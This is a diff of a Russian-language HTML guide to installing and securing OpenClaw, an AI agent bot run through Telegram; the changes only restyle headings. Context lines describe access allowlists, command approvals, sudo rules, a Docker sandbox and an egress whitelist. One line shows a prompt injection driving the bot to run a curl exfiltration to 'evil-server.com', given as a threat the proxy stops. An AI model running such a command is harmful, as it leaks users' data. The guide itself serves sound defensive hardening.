@@ -167,7 +167,7 @@
                             </div>
                         </div>
 
-                        <h3>Шаг 1: Установка OpenClaw</h3>
+                        <h3><span class="h-num">01</span> Шаг: Установка OpenClaw</h3>
 
                         <div class="code-block">
                             <div class="code-header">
@@ -179,7 +179,7 @@
 
                         <p>Скрипт скачает последнюю версию, добавит в PATH и проверит установку.</p>
 
-                        <h3>Шаг 2: Создание Telegram-бота</h3>
+                        <h3><span class="h-num">02</span> Шаг: Создание Telegram-бота</h3>
 
                         <div class="steps">
                             <div class="step">
@@ -205,7 +205,7 @@
                             </div>
                         </div>
 
-                        <h3>Шаг 3: Настройка (onboard)</h3>
+                        <h3><span class="h-num">03</span> Шаг: Настройка (onboard)</h3>
 
                         <div class="code-block">
                             <div class="code-header">
@@ -414,7 +414,7 @@ openclaw gateway --install-daemon</code></pre>
 
                         <p>Безопасность OpenClaw строится из нескольких уровней — от обязательного до продвинутого:</p>
 
-                        <h3>Уровень 1: Кто может писать боту (обязательно)</h3>
+                        <h3><span class="h-num">01</span> Уровень: Кто может писать боту <span class="h-badge h-badge-required">обязательно</span></h3>
 
                         <p>Без этого <strong>любой человек</strong> может найти твоего бота в Telegram и управлять им. Это первое, что нужно настроить.</p>
 
@@ -450,7 +450,7 @@ openclaw gateway --install-daemon</code></pre>
                             </div>
                         </div>
 
-                        <h3>Уровень 2: Что бот может выполнить (рекомендуется)</h3>
+                        <h3><span class="h-num">02</span> Уровень: Что бот может выполнить <span class="h-badge h-badge-recommended">рекомендуется</span></h3>
 
                         <p>Exec-approvals контролируют, какие команды бот может запускать. Создай файл <code>~/.openclaw/exec-approvals.json</code>:</p>
 
@@ -563,7 +563,7 @@ openclaw gateway --install-daemon</code></pre>
                             </tbody>
                         </table>
 
-                        <h3>Уровень 3: Sudo и системный доступ (по желанию)</h3>
+                        <h3><span class="h-num">03</span> Уровень: Sudo и системный доступ <span class="h-badge h-badge-optional">по желанию</span></h3>
 
                         <p>Для продвинутых задач (самообновление, перезапуск gateway) боту нужен sudo. Два варианта:</p>
 
@@ -605,7 +605,7 @@ neroot ALL=(ALL) NOPASSWD: /usr/bin/npm</code></pre>
                             </div>
                         </div>
 
-                        <h3>Уровень 4: Docker sandbox для субагентов (продвинутое)</h3>
+                        <h3><span class="h-num">04</span> Уровень: Docker sandbox для субагентов <span class="h-badge h-badge-advanced">продвинутое</span></h3>
 
                         <p>Субагенты (параллельные задачи) работают в Docker-контейнере с ограничениями. Главный агент работает на хосте.</p>
 
@@ -674,7 +674,7 @@ neroot ALL=(ALL) NOPASSWD: /usr/bin/npm</code></pre>
                             </div>
                         </div>
 
-                        <h3>Уровень 5: Egress whitelist — контроль исходящего трафика</h3>
+                        <h3><span class="h-num">05</span> Уровень: Egress whitelist — контроль исходящего трафика <span class="h-badge h-badge-advanced">продвинутое</span></h3>
 
                         <p>Это <strong>самый мощный слой защиты</strong> при полной автономии бота. Даже если prompt injection заставит бота выполнить <code>curl https://evil-server.com/steal?data=...</code> — прокси заблокирует запрос. Данные физически не смогут уйти на неизвестный сервер.</p>
 
@@ -863,7 +863,7 @@ iptables -I INPUT -i br-$(docker network inspect openclaw-egress \
                             </div>
                         </div>
 
-                        <h3>Способ 1: Tailscale Serve (рекомендуется)</h3>
+                        <h3><span class="h-num">01</span> Способ: Tailscale Serve <span class="h-badge h-badge-recommended">рекомендуется</span></h3>
 
                         <p>Официально рекомендуемый способ удалённого доступа. Tailscale обеспечивает VPN + автоматический HTTPS + аутентификацию — всё без открытия портов.</p>
 
@@ -971,7 +971,7 @@ tailscale serve status</code></pre>
                             </div>
                         </div>
 
-                        <h3>Способ 2: Прямой доступ по IP (без Tailscale)</h3>
+                        <h3><span class="h-num">02</span> Способ: Прямой доступ по IP (без Tailscale)</h3>
 
                         <p>Если Tailscale не используется, можно открыть gateway по IP. Менее безопасно — нет VPN и нет автоматического HTTPS.</p>
 
@@ -1025,7 +1025,7 @@ tailscale serve status</code></pre>
                             </div>
                         </div>
 
-                        <h3>Способ 3: SSH-туннель (максимальная безопасность)</h3>
+                        <h3><span class="h-num">03</span> Способ: SSH-туннель <span class="h-badge h-badge-recommended">макс. безопасность</span></h3>
 
                         <p>Никаких изменений в конфиге не нужно — gateway остаётся на loopback. Туннель создаёт локальный порт на вашем компьютере:</p>
 
